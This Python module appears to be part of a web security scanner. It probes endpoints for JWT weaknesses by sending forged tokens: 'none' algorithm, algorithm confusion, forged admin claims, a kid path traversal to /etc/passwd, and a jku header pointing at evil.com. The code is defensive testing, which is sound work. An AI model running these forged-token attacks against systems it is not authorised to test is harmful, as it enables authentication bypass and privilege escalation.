"""JWT manipulation active probe."""

import base64
import hashlib
import hmac
import json
import re
from typing import Any
from urllib.parse import parse_qsl, urlparse

import requests

from src.analysis.helpers import classify_endpoint, endpoint_base_key, endpoint_signature
from src.analysis.passive.runtime import ResponseCache
from src.core.utils.url_validation import is_safe_url

from ._confidence import probe_confidence, probe_severity

JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+")

JWT_AUTH_HEADERS = [
    "Authorization",
    "X-Access-Token",
    "X-Auth-Token",
    "X-JWT-Token",
    "X-Api-Token",
]

JWT_PARAM_NAMES = {
    "token",
    "access_token",
    "jwt",
    "auth_token",
    "bearer",
    "api_token",
    "id_token",
    "refresh_token",
}


def _safe_request(
    url: str,
    method: str = "GET",
    headers: dict[str, str] | None = None,
    body: bytes | None = None,
    timeout: int = 10,
) -> dict[str, Any]:
    req_headers = dict(headers or {})
    req_headers.setdefault(
        "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) SecurityPipeline/1.0"
    )
    req_headers.setdefault("Accept", "application/json, text/html, */*")
    if not is_safe_url(url):
        return {
            "status": 0,
            "headers": {},
            "body": "",
            "body_length": 0,
            "success": False,
            "error": "URL failed safety check",
        }
    try:
        resp = requests.request(
            method, url, headers=req_headers, data=body, timeout=timeout, verify=True
        )
        resp_body = resp.text or ""
        return {
            "status": getattr(resp, "status_code", 0),
            "headers": dict(resp.headers),
            "body": resp_body[:8000],
            "body_length": len(resp_body),
            "success": resp.status_code < 400,
        }
    except requests.RequestException as e:
        resp_body = ""
        resp_obj = getattr(e, "response", None)
        status = 0
        headers = {}
        if resp_obj is not None:
            try:
                resp_body = resp_obj.text
                status = getattr(resp_obj, "status_code", 0)
                headers = dict(resp_obj.headers)
            except Exception:
                pass
        return {
            "status": status,
            "headers": headers,
            "body": (resp_body or "")[:8000],
            "body_length": len(resp_body or ""),
            "success": False,
            "error": str(e),
        }
    except Exception as e:
        return {
            "status": 0,
            "headers": {},
            "body": "",
            "body_length": 0,
            "success": False,
            "error": str(e),
        }


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("utf-8")


def _b64url_decode(s: str) -> bytes:
    s = s + "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)


def _decode_jwt_part(part: str) -> dict | Any | None:
    try:
        decoded = _b64url_decode(part)
        return json.loads(decoded)
    except Exception:
        return None


def _create_jwt(header: dict, payload: dict, secret: bytes = b"secret") -> str:
    header_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()
    signature = hmac.new(secret, signing_input, hashlib.sha256).digest()
    sig_b64 = _b64url_encode(signature)
    return f"{header_b64}.{payload_b64}.{sig_b64}"


def _create_none_alg_jwt(payload: dict) -> str:
    header = {"alg": "none", "typ": "JWT"}
    header_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{header_b64}.{payload_b64}."


def _extract_jwts_from_response(response: dict[str, Any]) -> list[str]:
    tokens = []
    body = str(response.get("body_text") or response.get("body") or "")
    for match in JWT_RE.finditer(body):
        token = match.group(0)
        if token not in tokens:
            tokens.append(token)
    headers = response.get("headers", {})
    for key, val in headers.items():
        if isinstance(val, str) and "eyJ" in val:
            for match in JWT_RE.finditer(val):
                token = match.group(0)
                if token not in tokens:
                    tokens.append(token)
    return tokens


def _extract_jwt_from_headers(headers: dict[str, Any]) -> str | None:
    for header_name in JWT_AUTH_HEADERS:
        val = headers.get(header_name) or headers.get(header_name.lower())
        if val and isinstance(val, str):
            if val.startswith("Bearer "):
                val = val[7:]
            if JWT_RE.match(val):
                return val
    return None


def jwt_manipulation_probe(
    priority_urls: list[dict[str, Any]],
    response_cache: ResponseCache,
    limit: int = 10,
) -> list[dict[str, Any]]:
    """Test endpoints for JWT manipulation vulnerabilities.

    Tests algorithm confusion (RS256->HS256), 'none' algorithm attack,
    claim modification, kid header path traversal, jku/x5u injection,
    token expiry manipulation, and malformed token handling.

    Args:
        priority_urls: List of URL dicts with endpoint metadata.
        response_cache: Response cache for making requests.
        limit: Maximum number of findings to return.

    Returns:
        List of JWT manipulation findings.
    """
    findings: list[dict[str, Any]] = []
    seen: set[str] = set()

    for url_entry in priority_urls:
        if len(findings) >= limit:
            break
        url = str(url_entry.get("url", "") if isinstance(url_entry, dict) else url_entry).strip()
        if not url or not url.startswith(("http://", "https://")):
            continue

        endpoint_key = endpoint_signature(url)
        if endpoint_key in seen:
            continue
        seen.add(endpoint_key)

        if classify_endpoint(url) == "STATIC":
            continue

        original_resp = response_cache.get(url)
        if not original_resp:
            original_resp = _safe_request(url, timeout=8)
        if not original_resp or original_resp.get("status") in (404, 410, 503):
            continue

        original_status = original_resp.get("status", 0)
        str(original_resp.get("body") or original_resp.get("body_text") or "")
        original_headers = original_resp.get("headers", {})

        jwt_token = _extract_jwt_from_headers(original_headers)
        if not jwt_token:
            jwts = _extract_jwts_from_response(original_resp)
            if jwts:
                jwt_token = jwts[0]

        if not jwt_token:
            parsed = urlparse(url)
            query_pairs = parse_qsl(parsed.query, keep_blank_values=True)
            for k, v in query_pairs:
                if k.lower() in JWT_PARAM_NAMES and JWT_RE.match(v):
                    jwt_token = v
                    break

        if not jwt_token:
            continue

        parts = jwt_token.split(".")
        if len(parts) != 3:
            continue

        header = _decode_jwt_part(parts[0])
        payload = _decode_jwt_part(parts[1])
        if not header or not payload:
            continue

        url_issues: list[str] = []
        url_probes: list[dict[str, Any]] = []

        none_token = _create_none_alg_jwt(payload)
        for auth_header in JWT_AUTH_HEADERS:
            test_headers = dict(original_headers)
            test_headers[auth_header] = f"Bearer {none_token}"
            response = _safe_request(url, headers=test_headers, timeout=10)
            if response:
                status = response.get("status", 0)
                if status in (200, 302) and original_status in (401, 403):
                    url_issues.append("jwt_none_alg_bypass")
                    url_probes.append(
                        {
                            "attack": "none_algorithm",
                            "auth_header": auth_header,
                            "status_code": status,
                            "original_status": original_status,
                            "issues": ["jwt_none_alg_bypass"],
                        }
                    )
                    break
                elif status == 200 and original_status == 0:
                    body = str(response.get("body") or "")
                    if "error" not in body.lower() and "invalid" not in body.lower():
                        url_issues.append("jwt_none_alg_accepted")
                        url_probes.append(
                            {
                                "attack": "none_algorithm",
                                "auth_header": auth_header,
                                "status_code": status,
                                "issues": ["jwt_none_alg_accepted"],
                            }
                        )
                        break

        if isinstance(header, dict) and header.get("alg") == "RS256":
            modified_payload = dict(payload)
            modified_payload["admin"] = True
            modified_payload["role"] = "admin"
            modified_payload["is_admin"] = True
            alg_confusion_token = _create_jwt(
                {"alg": "HS256", "typ": "JWT"},
                modified_payload,
                secret=b"-----BEGIN PUBLIC KEY-----\n",
            )
            for auth_header in JWT_AUTH_HEADERS:
                test_headers = dict(original_headers)
                test_headers[auth_header] = f"Bearer {alg_confusion_token}"
                response = _safe_request(url, headers=test_headers, timeout=10)
                if response:
                    status = response.get("status", 0)
                    if status in (200, 302) and original_status in (401, 403):
                        url_issues.append("jwt_alg_confusion_bypass")
                        url_probes.append(
                            {
                                "attack": "alg_confusion_rs256_to_hs256",
                                "auth_header": auth_header,
                                "status_code": status,
                                "original_status": original_status,
                                "issues": ["jwt_alg_confusion_bypass"],
                            }
                        )
                        break

        if isinstance(payload, dict):
            modified_payload = dict(payload)
            modified_payload["admin"] = True
            modified_payload["role"] = "admin"
            modified_payload["is_admin"] = True
            modified_payload["user_id"] = 1
            modified_payload["sub"] = "admin"
            modified_payload["privilege"] = "elevated"
            modified_payload["access_level"] = "admin"

            modified_header = (
                dict(header) if isinstance(header, dict) else {"alg": "HS256", "typ": "JWT"}
            )
            modified_header["alg"] = "HS256"

            claim_token = _create_jwt(modified_header, modified_payload)
            for auth_header in JWT_AUTH_HEADERS:
                test_headers = dict(original_headers)
                test_headers[auth_header] = f"Bearer {claim_token}"
                response = _safe_request(url, headers=test_headers, timeout=10)
                if response:
                    status = response.get("status", 0)
                    body = str(response.get("body") or "")
                    if status in (200, 302) and original_status in (401, 403):
                        url_issues.append("jwt_claim_modification_bypass")
                        url_probes.append(
                            {
                                "attack": "claim_modification",
                                "auth_header": auth_header,
                                "modified_claims": list(modified_payload.keys()),
                                "status_code": status,
                                "original_status": original_status,
                                "issues": ["jwt_claim_modification_bypass"],
                            }
                        )
                        break
                    elif status == 200 and "admin" in body.lower():
                        url_issues.append("jwt_claim_admin_reflection")
                        url_probes.append(
                            {
                                "attack": "claim_modification",
                                "auth_header": auth_header,
                                "status_code": status,
                                "issues": ["jwt_claim_admin_reflection"],
                            }
                        )
                        break

        if isinstance(payload, dict):
            expired_payload = dict(payload)
            expired_payload["exp"] = 1000000000
            expired_payload["iat"] = 1000000000
            expired_payload["nbf"] = 1000000000

            expired_header = (
                dict(header) if isinstance(header, dict) else {"alg": "HS256", "typ": "JWT"}
            )
            expired_header["alg"] = "HS256"
            expired_token = _create_jwt(expired_header, expired_payload)
            for auth_header in JWT_AUTH_HEADERS:
                test_headers = dict(original_headers)
                test_headers[auth_header] = f"Bearer {expired_token}"
                response = _safe_request(url, headers=test_headers, timeout=10)
                if response:
                    status = response.get("status", 0)
                    if status == 200 and original_status in (401, 403):
                        url_issues.append("jwt_expired_token_accepted")
                        url_probes.append(
                            {
                                "attack": "expired_token",
                                "auth_header": auth_header,
                                "status_code": status,
                                "issues": ["jwt_expired_token_accepted"],
                            }
                        )
                        break

        if isinstance(header, dict):
            kid_traversal_header = dict(header)
            kid_traversal_header["kid"] = "../../../../../../etc/passwd"
            kid_traversal_header["alg"] = "HS256"
            kid_token = _create_jwt(kid_traversal_header, payload)
            for auth_header in JWT_AUTH_HEADERS:
                test_headers = dict(original_headers)
                test_headers[auth_header] = f"Bearer {kid_token}"
                response = _safe_request(url, headers=test_headers, timeout=10)
                if response:
                    status = response.get("status", 0)
                    if status in (200, 500) and original_status in (401, 403):
                        url_issues.append("jwt_kid_traversal_accepted")
                        url_probes.append(
                            {
                                "attack": "kid_path_traversal",
                                "auth_header": auth_header,
                                "status_code": status,
                                "issues": ["jwt_kid_traversal_accepted"],
                            }
                        )
                        break

            jku_header = dict(header)
            jku_header["jku"] = "https://evil.com/keys.json"
            jku_header["alg"] = "HS256"
            jku_token = _create_jwt(jku_header, payload)
            for auth_header in JWT_AUTH_HEADERS:
                test_headers = dict(original_headers)
                test_headers[auth_header] = f"Bearer {jku_token}"
                response = _safe_request(url, headers=test_headers, timeout=10)
                if response:
                    status = response.get("status", 0)
                    if status in (200, 302) and original_status in (401, 403):
                        url_issues.append("jwt_jku_injection_accepted")
                        url_probes.append(
                            {
                                "attack": "jku_injection",
                                "auth_header": auth_header,
                                "status_code": status,
                                "issues": ["jwt_jku_injection_accepted"],
                            }
                        )
                        break

        malformed_tokens = [
            ("empty_token", ""),
            ("single_part", "eyJhbGciOiJIUzI1NiJ9"),
            ("two_parts", "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0"),
            ("invalid_chars", "not.a.valid.jwt!!!"),
            ("null_byte", "eyJhbGciOiJIUzI1NiJ9.\x00.signature"),
            ("extra_parts", "a.b.c.d.e"),
        ]
        for mal_name, mal_token in malformed_tokens:
            for auth_header in JWT_AUTH_HEADERS:
                test_headers = dict(original_headers)
                test_headers[auth_header] = f"Bearer {mal_token}"
                response = _safe_request(url, headers=test_headers, timeout=10)
                if response:
                    status = response.get("status", 0)
                    if status == 200 and original_status in (401, 403):
                        url_issues.append(f"jwt_malformed_{mal_name}_bypass")
                        url_probes.append(
                            {
                                "attack": f"malformed_{mal_name}",
                                "auth_header": auth_header,
                                "status_code": status,
                                "original_status": original_status,
                                "issues": [f"jwt_malformed_{mal_name}_bypass"],
                            }
                        )
                        break
                break

        if url_probes:
            findings.append(
                {
                    "url": url,
                    "endpoint_key": endpoint_key,
                    "endpoint_base_key": endpoint_base_key(url),
                    "endpoint_type": classify_endpoint(url),
                    "issues": url_issues,
                    "probes": url_probes,
                    "confidence": probe_confidence(url_issues),
                    "severity": probe_severity(url_issues),
                }
            )

    findings.sort(key=lambda item: (-item["confidence"], item["url"]))
    return findings[:limit]
